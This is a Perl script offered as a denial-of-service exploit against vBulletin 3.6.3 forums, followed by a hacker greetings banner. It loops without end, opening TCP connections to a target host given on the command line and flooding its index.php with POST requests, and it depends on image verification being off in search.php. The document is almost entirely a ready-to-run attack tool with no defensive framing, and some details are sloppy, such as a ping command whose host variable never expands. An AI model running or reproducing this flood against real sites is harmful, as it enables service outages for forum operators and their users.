#!/c:/perl/bin
#

# VBulletin Denail of Service Exploit by 4.!.5
#
# created : !N 7h3 DARKNESS
# CODED BY: R3d-D3V!L
#
# important => Image Verification in (search.php) is NOT Enabled.
# It tested on V3.6.3
#
#Perl Script
use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<10; $i--)
{
$user="vb".$rand.$i;
$data = "s="
;
$len = length $data;
$foo = "POST ".$dir."index.php HTTP/1.1\r\n".
"Accept: */*\r\n".
"Accept-Language: en-gb\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $len\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$foo", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "\tusage: \n";
print "\t$0 <host> </dir/>\n";
print "\tex: $0 127.0.0.1 /forum/\n";
print "\tex2: $0 127.0.0.1 /\n\n";
exit();
};
# Exploit By 4.!.5...




######################################################


[~]-----------------------------{D3V!L5 0F 7h3 SYS73M!?!}----------------------------------

[~] Greetz tO: dolly & L!TTLE 547r & 0r45hy & DEV!L_MODY & po!S!ON Sc0rp!0N & mAG0ush_1987

[~]70 ALL ARAB!AN HACKER 3X3PT : LAM3RZ

[~] spechial thanks : ab0 mohammed & XP_10 h4CK3R & JASM!N & c0prA & MARWA & N0RHAN & S4R4

[?]spechial SupP0RT: MY M!ND ;) & dookie2000ca & ((OFFsec))

[?]4r48!4n.!nforma7!0N.53cur!7y ---> ((r3d D3v!L))--M2Z--DEV!L_Ro07--JUPA

[~]spechial FR!ND: 74M3M

[~] !'M 4R48!4N 3XPL0!73R.

[~] {[(D!R 4ll 0R D!E)]};

[~]--------------------------------------------------------------------------------